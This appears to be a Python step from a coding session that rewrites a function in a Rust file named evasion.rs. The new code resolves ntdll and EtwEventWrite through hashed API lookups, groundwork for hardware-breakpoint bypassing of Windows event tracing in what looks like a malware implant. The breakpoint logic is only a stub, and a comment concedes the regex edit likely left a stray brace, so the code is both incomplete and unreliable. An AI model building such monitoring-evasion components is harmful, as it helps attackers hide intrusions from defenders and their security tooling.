with open("agent/src/evasion.rs", "r") as f:
    c = f.read()

# Let's cleanly replace setup_hardware_breakpoints
import re
new_def = r'''pub unsafe fn setup_hardware_breakpoints() {
    let ntdll_hash = pe_resolve::hash_str("ntdll.dll", 0);
    let etw_hash = pe_resolve::hash_str("EtwEventWrite", 0);
    
    let ntdll = pe_resolve::get_module(ntdll_hash) as *mut _;
    if ntdll == std::ptr::null_mut() { return; }
    
    let etw = pe_resolve::get_export(ntdll as _, etw_hash);
    if etw.is_null() { return; }
    
    // Hardware breakpoint stub logic
    let _ = etw;
}'''
c = re.sub(r'pub unsafe fn setup_hardware_breakpoints\(\).*?\}', new_def, c, flags=re.DOTALL)
# It left an extra } probably because my regex missed something earlier, or matched too much. Let's trace.
